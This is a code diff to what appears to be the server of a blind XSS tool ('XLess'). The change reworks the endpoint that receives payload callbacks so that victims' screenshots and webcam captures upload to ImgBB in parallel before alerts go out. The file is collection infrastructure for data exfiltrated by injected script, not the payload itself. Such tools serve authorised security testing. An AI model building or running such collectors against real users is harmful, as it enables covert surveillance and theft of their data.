@@ -504,8 +504,6 @@ app.all("/message", async (req, res) => {
 });
 
 app.post("/c", async (req, res) => {
-  // Always respond OK first to avoid blocking the payload
-  res.send("ok\n");
 
   try {
     let data = req.body;
@@ -514,53 +512,74 @@ app.post("/c", async (req, res) => {
       return;
     }
 
-    // Upload screenshots to ImgBB (supports multiple)
-    data["Screenshot URL"] = "";
-    var screenshotUrls = [];
+    // Upload screenshots and webcam in parallel to save time (Netlify has 10s limit)
+    const uploadPromises = [];
 
-    // Get all screenshots: prefer Screenshots array, fall back to single Screenshot
+    // Screenshots
     var screenshotsToUpload = [];
     if (data["Screenshots"] && Array.isArray(data["Screenshots"])) {
-      screenshotsToUpload = data["Screenshots"].filter(function (s) {
-        return s && typeof s === 'string' && s.startsWith("data:image");
-      });
+      screenshotsToUpload = data["Screenshots"].filter(s => s && typeof s === 'string' && s.startsWith("data:image"));
     } else if (data["Screenshot"] && typeof data["Screenshot"] === 'string' && data["Screenshot"].startsWith("data:image")) {
       screenshotsToUpload = [data["Screenshot"]];
     }
 
     if (imgbb_api_key && screenshotsToUpload.length > 0) {
-      for (var si = 0; si < screenshotsToUpload.length; si++) {
-        var encoded = screenshotsToUpload[si].replace(/^data:image\/\w+;base64,/, "");
-        try {
-          var imgRes = await uploadImage(encoded);
-          var imgOut = JSON.parse(imgRes);
-          if (imgOut.data && imgOut.data.url) {
-            screenshotUrls.push(imgOut.data.url);
-            console.log("Screenshot " + (si + 1) + " uploaded:", imgOut.data.url);
-          }
-        } catch (e) {
-          console.error("Screenshot " + (si + 1) + " upload error:", e.message);
-        }
-      }
-      data["Screenshot URL"] = screenshotUrls.length > 0 ? screenshotUrls[0] : "NA";
-      data["Screenshot URLs"] = screenshotUrls;
+      screenshotsToUpload.forEach((b64, si) => {
+        const encoded = b64.replace(/^data:image\/\w+;base64,/, "");
+        uploadPromises.push(
+          uploadImage(encoded)
+            .then(res => JSON.parse(res))
+            .then(out => {
+              if (out.data && out.data.url) {
+                console.log(`Screenshot ${si + 1} uploaded: ${out.data.url}`);
+                return { type: 'screenshot', url: out.data.url, index: si };
+              }
+              return null;
+            })
+            .catch(e => {
+              console.error(`Screenshot ${si + 1} upload error:`, e.message);
+              return null;
+            })
+        );
+      });
     }
 
-    // Upload webcam photo if captured
-    data["Webcam URL"] = "";
+    // Webcam
     if (imgbb_api_key && data["Webcam"] && typeof data["Webcam"] === 'string' && data["Webcam"].startsWith("data:image")) {
       const encoded_webcam = data["Webcam"].replace(/^data:image\/\w+;base64,/, "");
-      try {
-        const webcamRes = await uploadImage(encoded_webcam);
-        const webcamOut = JSON.parse(webcamRes);
-        if (webcamOut.data && webcamOut.data.url) {
-          data["Webcam URL"] = webcamOut.data.url;
-          console.log("Webcam photo uploaded:", webcamOut.data.url);
-        }
-      } catch (e) {
-        console.error("Webcam upload error:", e.message);
-      }
+      uploadPromises.push(
+        uploadImage(encoded_webcam)
+          .then(res => JSON.parse(res))
+          .then(out => {
+            if (out.data && out.data.url) {
+              console.log(`Webcam uploaded: ${out.data.url}`);
+              return { type: 'webcam', url: out.data.url };
+            }
+            return null;
+          })
+          .catch(e => {
+            console.error(`Webcam upload error:`, e.message);
+            return null;
+          })
+      );
     }
+
+    // Process all uploads
+    const uploadResults = await Promise.all(uploadPromises);
+    const screenshotUrls = [];
+    data["Webcam URL"] = "";
+
+    uploadResults.forEach(res => {
+      if (!res) return;
+      if (res.type === 'screenshot') {
+        screenshotUrls.push(res.url);
+      } else if (res.type === 'webcam') {
+        data["Webcam URL"] = res.url;
+      }
+    });
+
+    data["Screenshot URL"] = screenshotUrls.length > 0 ? screenshotUrls[0] : "NA";
+    data["Screenshot URLs"] = screenshotUrls;
 
     // Now handle the regular alerts
     data["Remote IP"] =
@@ -588,8 +607,13 @@ app.post("/c", async (req, res) => {
     // Send Notifications (pass all screenshot URLs and webcam URL)
     var allScreenshotUrls = data["Screenshot URLs"] || (data["Screenshot URL"] ? [data["Screenshot URL"]] : []);
     await sendNotifications(alert, allScreenshotUrls, "XLess Blind XSS Alert — " + domain, data["Webcam URL"]);
+
+    res.status(200).send("ok\n");
   } catch (e) {
     console.error("Critical error processing /c payload:", e);
+    if (!res.headersSent) {
+      res.status(500).send("Error\n");
+    }
   }
 });
 
